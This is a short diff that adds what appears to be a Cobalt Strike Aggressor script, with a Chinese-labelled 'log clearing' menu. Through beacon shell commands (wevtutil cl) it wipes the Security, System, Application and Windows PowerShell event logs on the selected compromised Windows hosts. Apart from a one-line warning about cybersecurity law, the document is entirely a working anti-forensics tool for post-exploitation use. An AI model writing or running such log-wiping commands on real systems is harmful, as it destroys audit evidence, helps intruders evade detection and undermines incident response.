@@ -1,0 +1,11 @@
+menu "日志清除" {
+  item "清除系统日志" {
+    prompt_text("再次确认清除系统日志：", "请详细阅读网络安全法", lambda({
+      bshell(@ids, "wevtutil cl security");
+      bshell(@ids, "wevtutil cl system");
+      bshell(@ids, "wevtutil cl application");
+      bshell(@ids, "wevtutil cl \"windows powershell\"");
+    }, @ids => $1));
+  }
+
+}
